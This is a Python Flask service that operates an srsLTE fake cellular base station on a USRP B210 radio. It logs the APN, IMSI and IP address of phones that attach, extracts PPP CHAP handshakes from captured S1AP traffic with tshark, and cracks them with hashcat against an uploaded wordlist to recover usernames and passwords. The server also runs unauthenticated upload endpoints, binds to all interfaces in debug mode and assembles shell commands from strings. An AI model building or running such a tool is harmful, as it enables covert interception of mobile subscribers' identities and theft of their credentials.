import os
import json
import subprocess
from flask import Flask, request

app = Flask(__name__)
@app.route('/start', methods={"POST"})
def start():
    conf = request.get_data()
    json_conf = json.loads(conf)
    band = json_conf.get("band")
    apn = json_conf.get("apn")
    mcc = json_conf.get("mcc")
    mnc = json_conf.get("mnc")
    network = json_conf.get("network")
    result = start_srsLTE(band, apn, mcc, mnc, network)
    return result

@app.route('/stop', methods={"POST"})
def stop():
    result = stop_srsLTE()
    return result

@app.route('/basicinfo', methods=["POST"])
def basicInfo():
    result = getBasicInfo()
    return result

@app.route('/allinfo', methods=["POST"])
def allInfo():
    result = getAllInfo()
    return result

@app.route('/userupload', methods=["POST"])
def userUpload():
    status = False
    message_id = 0 # 0 -> upload failed  1 -> upload success  2 -> no file
    message = "upload Failed"
    userfile = request.files['userdb']
    if userfile is None:
        message_id = 2
        message = "no file"
    else:
        upload_path = os.getcwd() + "/conf/user_db.csv"
        userfile.save(upload_path)
        status = True
        message_id = 1
        message = "upload success"
    result = {'status': status, 'message_id': message_id, 'message': message}
    json_result = json.dumps(result)
    print(json_result)
    return json_result

@app.route('/passwordupload', methods=["POST"])
def passwordUpload():
    status = False
    message_id = 0 # 0 -> upload failed  1 -> upload success  2 -> no file
    message = "upload Failed"
    worldlistfile = request.files['wordlist']
    if worldlistfile is None:
        message_id = 2
        message = "no file"
    else:
        upload_path = os.getcwd() + "/wordlist.list"
        worldlistfile.save(upload_path)
        status = True
        message_id = 1
        message = "upload success"
    result = {'status': status, 'message_id': message_id, 'message': message}
    json_result = json.dumps(result)
    print(json_result)
    return json_result

########################################################
def start_srsLTE(band, apn, mcc, mnc, network):
    ### default start failed
    status = False
    message_id = 0 # 0 -> start failed  1 -> start success  2 -> is running    3 -> Incomplete parameters    4 -> device is not connected, please connect usrp device.
    message = "Start Failed"
    # Determine whether the device is connect
    ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
    if(len(ps_command_resault) == 0):
        # Determine whether the parameters are complete.
        if(len(band) <= 0 or len(apn) <= 0 or len(mcc) <= 0 or len(mnc) <= 0 or len(network) <= 0):
            message_id = 3
            message = "Incomplete parameters"
        else:
            # Determine whether it is running.
            if(usrpConnect()):
                current_path = os.getcwd()
                # start_command = "bash " + current_path + "/run.sh" + " " + band + " " + apn + " " + mcc + " " + mnc + " " + network
                # os.system(start_command)
                # # Waitting for srsLTE start 
                # os.system("sleep 3")
                subprocess.call(["bash", current_path+"/run.sh", band, apn, mcc, mnc,network])
                ps_command_resault = os.popen("ps -aux| grep -v 'grep' | grep srs").read()
                # Determine whether the program is started
                if(len(ps_command_resault) != 0):
                    status = True
                    message_id = 1
                    message = "Start successfully"
            else:
                message_id = 4
                message = "device is not connected, please connect usrp device."
    else:
        message_id = 2
        message = "is running"

    result = {'status': status, "message_id": message_id, "message": message}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def stop_srsLTE():
    status = False
    message_id = 0 # 0 -> stop failed   1 -> stop success   2 -> not running
    message = "Stop failed."
    ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
    if(len(ps_command_resault) == 0):
        message_id = 2
        message = "Not running."
    else:
        current_path = os.getcwd()
        # stop_command = "bash " + current_path + "/stop.sh"
        # os.system(stop_command)
        # # Waitting for srsLTE stop.
        # os.system("sleep 3")
        subprocess.call(["bash", current_path+"/stop.sh"])
        os.system("sleep 1.5")
        ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
        if(len(ps_command_resault) == 0):
            status = True
            message_id = 1
            message = "Stop successfully."
    result = {'status': status, "message_id": message_id, "message": message}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def getBasicInfo():
    status = False
    message_id = 0  # 0 -> Failed   1 -> Getting information success    2 -> Is not running, please start first    3 -> no UE connected
    message = "Failed"
    apn = None
    imsi = None
    ip = None
    current_path = os.getcwd()
    epc_log_path = current_path + "/log/srsLTE_epc.log"
    ps_command_resault = os.popen("ps -aux | grep -v 'grep' | grep srs").read()
    # Determine whether the program is started
    if(len(ps_command_resault) <= 0): # not start
        message_id = 2
        message = "Is not running, please start first."
    else:
        apn_info = os.popen("cat " + epc_log_path + " | grep 'ESM Info: APN'").read()
        imsi_info = os.popen("cat " + epc_log_path + " | grep 'Found User'").read()
        ip_info = os.popen("cat " + epc_log_path + " | grep 'get_new_ue_ipv4 pool ip addr'").read()
        if(len(apn_info) > 0 and len(imsi_info) > 0 and len(ip_info) > 0):
            status = True
            message_id = 1
            message = "Getting information success."
            apn = apn_info.split()[-1]
            imsi = imsi_info.split()[-1]
            ip = ip_info.split()[-1]
        else:
            message_id = 3
            message = "no UE connected"
    result = {'status': status, 'message_id': message_id, 'message': message, 'apn': apn, 'imsi': imsi, 'ip': ip}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def getAllInfo():
    status = False
    # 0 -> Failed    
    # 1 -> Getting information success    
    # 2 -> Can not get UE's data, please start first and connect UE, or just connect UE. Then try again.    
    # 3 -> Can not get username and password 
    # 4 -> Can not get password from the dict  
    # 5 -> Stop program failed, please try to stop manually.
    message_id = 0 
    message = "Failed"
    apn = None
    imsi = None
    ip = None
    username = None
    password = None
    current_path = os.getcwd()
    # log & conf path
    epc_log_path = current_path + "/log/srsLTE_epc.log"
    s1ap_path = current_path + '/log/srsLTE_enb_s1ap.pcap'
    wordlist_path = current_path + '/wordlist.list'
    # get apn,imsi and ip from srsLTE_epc.log
    apn_info = os.popen("cat " + epc_log_path + " | grep 'ESM Info: APN'").read()
    imsi_info = os.popen("cat " + epc_log_path + " | grep 'Found User'").read()
    ip_info = os.popen("cat " + epc_log_path + " | grep 'get_new_ue_ipv4 pool ip addr'").read()
    # apn,imsi & ip can't be empty
    if(len(apn_info) > 0 and len(imsi_info) > 0 and len(ip_info) > 0):
        # stop srsLTE
        stop_result = stop_srsLTE()
        json_stop_result = json.loads(stop_result)
        # The peogram must be stop before get all information.
        if(json_stop_result.get("status") or json_stop_result.get("message_id") == 2):   
            apn = apn_info.split()[-1] # get apn
            imsi = imsi_info.split()[-1] # get imsi
            ip = ip_info.split()[-1] #get ip
            # use tshark to parse srsLTE_enb_s1ap.pcap, to get username,password
            tshark_command = "tshark -o \"uat:user_dlts:\\\"User 3 (DLT=150)\\\",\\\"s1ap\\\",\\\"0\\\",\\\"\\\",\\\"0\\\",\\\"\\\"\" -r " + s1ap_path + " -Y \"chap\" -V 2>&1 | grep -A 7 \"PPP Challenge Handshake\" "
            tshark_result = os.popen(tshark_command).read()
            # if tshark has data
            if(len(tshark_result) > 0):
                info = tshark_result.split()
                # get identifer
                response_identifer = info[9]
                if(len(response_identifer) == 1): response_identifer = "0" + response_identifer
                chap_challenge_value = info[17] # get challenge value
                chap_response_value = info[38] # get response value
                ue_name = info[19] # get UE's username
                hash_pass = chap_response_value + ":" + chap_challenge_value + ":" + response_identifer # splicing to get hash
                # use hashcat to blast passwords
                os.system("hashcat -m 4800 -a 0 " + str(hash_pass) + " " + wordlist_path + " --force 2>&1")
                pass_result = os.popen("hashcat -m 4800 -a 0 " + str(hash_pass) + " " + wordlist_path + " --show 2>&1").read()
                # if hashcat has data and UE has information
                if(len(ue_name) > 0 and len(pass_result) > 0):
                    status = True
                    message_id = 1
                    message = "Getting information success."
                    username = ue_name
                    password = pass_result.split(":")[-1][:-1]
                else:
                    message_id = 4
                    message = "Can not get password from the dict"
                    if(len(ue_name) > 0): username = ue_name
            else:
                message_id = 3
                message = "Can not get username and password"
        else:
            message_id = 5
            message = "Stop program failed, please try to stop manually."
    else:
        message_id = 2
        message = "Can not get UE's data, please start first and connect UE, or just connect UE. Then try again."
    result = {"status": status, "message_id": message_id, "message": message, 'apn': apn, 'imsi': imsi, 'ip': ip, "username": username, "password": password}
    result_json = json.dumps(result)
    print(result_json)
    return result_json

def usrpConnect():
    status = False # default not connect
    devices_status = os.popen("uhd_find_devices 2>&1 | grep B210").read()
    if(len(devices_status) > 0):
        status = True
    return status


if __name__=="__main__":
    app.run(host='0.0.0.0', port=8081, debug=True)
